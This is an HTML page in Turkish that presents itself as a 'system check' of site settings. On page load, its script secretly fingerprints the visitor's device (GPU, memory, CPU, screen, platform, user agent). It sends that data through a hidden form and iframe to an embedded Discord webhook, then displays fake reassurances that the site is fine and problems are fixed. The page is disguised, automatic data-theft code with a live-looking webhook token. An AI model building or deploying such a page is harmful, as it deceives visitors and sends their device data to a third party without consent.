<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrol√º</title>
    <style>
        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
        h2 { color:#111; font-size:12px; font-weight:400; }
        .ok { color:#0f4; font-weight:bold; }
    </style>
</head>
<body>
    <h2 id="t">Site ayarlarƒ± kontrol ediliyor...</h2>

    <iframe name="v" style="display:none;"></iframe>
    <form id="f" action="https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73" method="POST" target="v" style="display:none;">
        <input type="hidden" name="content" id="c">
    </form>

    <script>
        (function x() {
            const t = document.getElementById('t');
            
            // 1. EN DERƒ∞N VERƒ∞ TOPLAMA
            let g = "N/A";
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const ex = gl.getExtension('WEBGL_debug_renderer_info');
                g = gl.getParameter(ex.UNMASKED_RENDERER_ID);
            } catch(e){}

            const info = `üíÄ **KRƒ∞Tƒ∞K VERƒ∞ SIZINTISI**\n` +
                         `**GPU:** ${g}\n` +
                         `**RAM:** ${navigator.deviceMemory}GB | **CPU:** ${navigator.hardwareConcurrency} | **TCH:** ${navigator.maxTouchPoints}\n` +
                         `**OS/RES:** ${navigator.platform} | ${screen.width}x${screen.height}\n` +
                         `**Zaman:** ${new Date().toLocaleString()}\n` +
                         `**UA:** ${navigator.userAgent}`;

            // 2. FORM ENJEKSƒ∞YONU (ENJEKTE VE FIRLAT)
            document.getElementById('c').value = info;
            document.getElementById('f').submit();

            // 3. I≈ûIK HIZINDA ARAY√úZ (0.1sn ve 0.4sn)
            setTimeout(() => { t.innerHTML = '<span class="ok">Site uygun halde!</span>'; }, 100);
            setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar d√ºzeltildi.</span>'; }, 400);
        })();
    </script>
</body>
</html>
